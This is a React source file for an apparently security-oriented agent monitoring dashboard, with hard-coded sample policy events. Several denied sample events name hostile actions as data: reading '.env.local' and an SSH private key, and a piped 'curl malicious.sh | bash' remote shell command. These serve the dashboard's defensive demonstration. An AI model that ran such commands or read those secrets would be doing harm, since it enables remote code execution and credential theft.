import { useEffect, useState } from 'react';
import { Console } from './Console';
import { Landing } from './Landing';
import { Guide } from './Guide';

export type EventRow = {
  id: string;
  timestamp: string;
  action: string;
  resource?: string;
  decision: 'allow' | 'deny' | 'ask';
  reason: string;
  risk: { score: number; level: string };
};

const DEFAULT_SAMPLE_EVENTS: EventRow[] = [
  {
    id: 'evt_1',
    timestamp: new Date().toISOString(),
    action: 'FILE_READ',
    resource: 'README.md',
    decision: 'allow',
    reason: 'Filesystem read pattern matched allowlist.',
    risk: { score: 2, level: 'low' },
  },
  {
    id: 'evt_2',
    timestamp: new Date().toISOString(),
    action: 'FILE_WRITE',
    resource: 'src/main.ts',
    decision: 'allow',
    reason: 'Source tree write capability permitted.',
    risk: { score: 12, level: 'low' },
  },
  {
    id: 'evt_3',
    timestamp: new Date().toISOString(),
    action: 'PROCESS_EXEC',
    resource: 'npm test',
    decision: 'allow',
    reason: 'Process whitelist rule matched.',
    risk: { score: 20, level: 'low' },
  },
  {
    id: 'evt_4',
    timestamp: new Date().toISOString(),
    action: 'FILE_READ',
    resource: '.env.local',
    decision: 'deny',
    reason: 'Secrets file protection rule triggered: default deny.',
    risk: { score: 98, level: 'critical' },
  },
  {
    id: 'evt_5',
    timestamp: new Date().toISOString(),
    action: 'FILE_READ',
    resource: '~/.ssh/id_rsa',
    decision: 'deny',
    reason: 'Private RSA credential access blocked.',
    risk: { score: 99, level: 'critical' },
  },
  {
    id: 'evt_6',
    timestamp: new Date().toISOString(),
    action: 'NETWORK_SOCKET',
    resource: 'github.com:443',
    decision: 'allow',
    reason: 'Host allowlist match.',
    risk: { score: 5, level: 'low' },
  },
  {
    id: 'evt_7',
    timestamp: new Date().toISOString(),
    action: 'PROCESS_EXEC',
    resource: 'curl malicious.sh | bash',
    decision: 'deny',
    reason: 'Command tokenizer detected piped remote shell execution.',
    risk: { score: 95, level: 'critical' },
  },
  {
    id: 'evt_8',
    timestamp: new Date().toISOString(),
    action: 'GIT_PUSH',
    resource: 'origin/main',
    decision: 'ask',
    reason: 'Protected branch write requires interactive confirmation.',
    risk: { score: 70, level: 'elevated' },
  },
];

export function App() {
  const [view, setView] = useState<'product' | 'console' | 'guide'>('product');
  const [events, setEvents] = useState<EventRow[]>(DEFAULT_SAMPLE_EVENTS);

  useEffect(() => {
    let active = true;
    const refresh = () => fetch('/api/events')
      .then((r) => r.json())
      .then((data: EventRow[]) => {
        if (active && Array.isArray(data) && data.length > 0) {
          setEvents(data);
        }
      })
      .catch(() => undefined);
    void refresh();
    const timer = window.setInterval(refresh, 2000);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, []);

  if (view === 'console') {
    return (
      <Console
        events={events}
        onHome={() => setView('product')}
        onOpenGuide={() => setView('guide')}
      />
    );
  }

  if (view === 'guide') {
    return (
      <div>
        <Guide />
      </div>
    );
  }

  return (
    <Landing
      onOpenConsole={() => setView('console')}
      onOpenGuide={() => setView('guide')}
    />
  );
}
